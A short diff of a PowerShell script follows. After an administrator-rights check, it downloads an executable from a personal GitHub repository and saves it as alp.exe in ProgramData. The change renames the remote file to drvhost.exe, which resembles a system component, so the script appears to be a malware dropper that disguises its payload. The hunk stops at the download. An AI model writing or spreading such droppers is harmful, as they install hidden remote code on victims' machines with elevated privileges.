@@ -3,7 +3,7 @@ if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     exit
 }
 
-$url = "https://github.com/AnatolyPivder/R/raw/refs/heads/main/a.exe"
+$url = "https://github.com/AnatolyPivder/R/raw/refs/heads/main/drvhost.exe"
 
 $outputPath = "$env:ProgramData\alp.exe"
 (New-Object System.Net.WebClient).DownloadFile($url, $outputPath)
